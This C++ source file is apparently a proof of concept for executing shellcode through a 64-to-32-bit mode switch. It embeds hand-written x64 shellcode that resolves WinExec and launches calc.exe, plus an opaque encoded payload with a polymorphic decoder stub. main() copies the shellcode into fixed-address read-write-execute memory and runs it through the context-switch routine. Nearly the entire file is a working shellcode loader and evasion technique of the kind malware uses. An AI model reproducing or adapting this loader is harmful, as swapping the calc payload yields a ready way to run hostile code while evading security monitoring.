// iretd-x64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>

#include <iostream>


extern "C" void spawn_calc_64();
extern "C" void no_ctx_switch();
extern "C" void ctx_switch_64to32();
extern "C" void ctx_switch_32to64();
extern "C" void ctx_switch_32to64_2();


extern "C" unsigned char buf_64[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

extern "C" unsigned char buf[] =
"\xda\xdc\xbf\x06\x24\x22\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x31\x83\xc6\x04\x31\x7e\x14\x03\x7e\x12\xc6\xd7\x37"
"\xf2\x84\x18\xc8\x02\xe9\x91\x2d\x33\x29\xc5\x26\x63\x99"
"\x8d\x6b\x8f\x52\xc3\x9f\x04\x16\xcc\x90\xad\x9d\x2a\x9e"
"\x2e\x8d\x0f\x81\xac\xcc\x43\x61\x8d\x1e\x96\x60\xca\x43"
"\x5b\x30\x83\x08\xce\xa5\xa0\x45\xd3\x4e\xfa\x48\x53\xb2"
"\x4a\x6a\x72\x65\xc1\x35\x54\x87\x06\x4e\xdd\x9f\x4b\x6b"
"\x97\x14\xbf\x07\x26\xfd\x8e\xe8\x85\xc0\x3f\x1b\xd7\x05"
"\x87\xc4\xa2\x7f\xf4\x79\xb5\xbb\x87\xa5\x30\x58\x2f\x2d"
"\xe2\x84\xce\xe2\x75\x4e\xdc\x4f\xf1\x08\xc0\x4e\xd6\x22"
"\xfc\xdb\xd9\xe4\x75\x9f\xfd\x20\xde\x7b\x9f\x71\xba\x2a"
"\xa0\x62\x65\x92\x04\xe8\x8b\xc7\x34\xb3\xc1\x16\xca\xc9"
"\xa7\x19\xd4\xd1\x97\x71\xe5\x5a\x78\x05\xfa\x88\x3d\xf9"
"\xb0\x91\x17\x92\x1c\x40\x2a\xff\x9e\xbe\x68\x06\x1d\x4b"
"\x10\xfd\x3d\x3e\x15\xb9\xf9\xd2\x67\xd2\x6f\xd5\xd4\xd3"
"\xa5\xb6\xbb\x47\x25\x17\x5e\xe0\xcc\x67";



int main()
{
    LPVOID pmem = VirtualAlloc((LPVOID)0x10000000, 0x1000, 0x3000u, 0x40u);
    
    //memcpy_s((void*)0x10000000, 0x1000, &ctx_switch_32to64, 0x24);
    memcpy_s((void*)0x10000000, 0x1000, &ctx_switch_32to64, 0x60);
    memcpy_s((void*)(0x10000000+0x60), 0x1000, &buf_64, sizeof(buf));

    DWORD old = 0;
    VirtualProtect(&buf, 1, PAGE_EXECUTE_READWRITE, &old);
    VirtualProtect(&buf_64, 1, PAGE_EXECUTE_READWRITE, &old);

    ctx_switch_64to32();

}
